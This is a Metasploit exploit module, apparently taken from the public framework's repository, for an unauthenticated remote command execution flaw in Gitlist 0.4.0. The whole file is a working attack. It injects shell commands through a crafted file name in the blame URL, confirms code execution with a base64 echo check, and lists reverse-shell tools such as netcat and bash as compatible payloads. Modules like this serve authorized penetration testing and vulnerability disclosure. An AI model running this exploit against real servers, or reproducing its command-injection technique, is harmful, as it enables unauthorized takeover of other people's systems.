# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Gitlist Unauthenticated Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an unauthenticated remote command execution vulnerability
        in version 0.4.0 of Gitlist. The problem exists in the handling of an specially
        crafted file name when trying to blame it.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Author&#039;         =>
        [
          &#039;drone&#039;, #discovery/poc by @dronesec
          &#039;Brandon Perry <bperry.volatile@gmail.com>&#039; #Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-4511&#039;],
          [&#039;EDB&#039;, &#039;33929&#039;],
          [&#039;URL&#039;, &#039;http://hatriot.github.io/blog/2014/06/29/gitlist-rce/&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 8192, # max length of GET request really
          &#039;BadChars&#039;    => "&\x20",
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic telnet python perl bash gawk netcat netcat-e ruby php openssl&#039;,
            }
        },
      &#039;Targets&#039;        =>
        [
          [&#039;Gitlist 0.4.0&#039;, { }]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 30 2014&#039;
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable instance&#039;, &#039;/&#039;])
      ], self.class)
  end

  def check
    repo = get_repo

    if repo.nil?
      return Exploit::CheckCode::Unknown
    end

    chk = Rex::Text.encode_base64(rand_text_alpha(rand(32)+5))

    res = send_command(repo, "echo${IFS}" + chk + "|base64${IFS}--decode")

    if res && res.body
      if res.body.include?(Rex::Text.decode_base64(chk))
        return Exploit::CheckCode::Vulnerable
      elsif res.body.to_s =~ /sh.*not found/
        return Exploit::CheckCode::Vulnerable
      end
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    repo = get_repo
    if repo.nil?
      fail_with(Failure::Unknown, "#{peer} - Failed to retrieve the remote repository")
    end
    send_command(repo, payload.encoded)
  end

  def get_repo
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, "/")
    })

    unless res
      return nil
    end

    first_repo = /href="\/gitlist\/(.*)\/"/.match(res.body)

    unless first_repo && first_repo.length >= 2
      return nil
    end

    repo_name = first_repo[1]

    repo_name
  end

  def send_command(repo, cmd)
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, repo, &#039;blame&#039;, &#039;master&#039;, &#039;""`&#039; + cmd + &#039;`&#039;)
    }, 1)

    res
  end

end

